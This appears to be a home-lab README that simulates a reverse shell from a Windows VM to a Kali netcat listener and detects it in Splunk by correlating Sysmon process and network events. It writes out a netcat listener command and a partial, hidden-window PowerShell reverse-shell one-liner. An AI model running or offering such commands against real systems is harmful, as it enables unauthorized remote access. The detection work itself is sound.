# Reverse Shell 

This lab simulates a reverse on a Windows 8.1 VM and detects it using Splunk. It follows MITRE ATT&CK techniques:
- T1059.001 - PowerShell, 
- T1059.003 - Windows Command Shell

---

## 🛠️ Lab Setup

### Machines
- **Attacker**: Kali Linux (Hydra, smbclient)
- **Victim**: Windows 8.1 (Build 9600) with:
  - Sysmon
  - Splunk Universal Forwarder
- **SIEM**: Splunk Enterprise (host machine)

### Tools Used
- `netcat`: for reverse shell handling
- `Sysmon`: for process and network monitoring
- `Splunk`: for log ingestion and analysis

---

## 🧪 Attack Steps

- Ran nc -lnvp 4444 from Kali to open connection form windows.

- Simulated a reverse shell (PowerShell/cmd) from the Windows VM to Kali listener on a non-standard port.

# PowerShell TCP reverse shell (single-line; run in isolated lab only):

   powershell -NoP -NonI -W Hidden -Command "$client=New-Object System.Net.Sockets.TcpClient(\'192.168.29.30\',4444)

- Detection: Correlate Sysmon EventID=1 (process create) with EventID=3 (network connection) for the same ProcessId / commandline.
   ```spl
    index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=1 OR EventCode=3)
    | transaction ProcessId maxspan=1m
    | search Image="*powershell.exe" OR Image="*cmd.exe"
    | table _time, ProcessId, Image, CommandLine, src_ip, dest_ip, dest_port
   ```


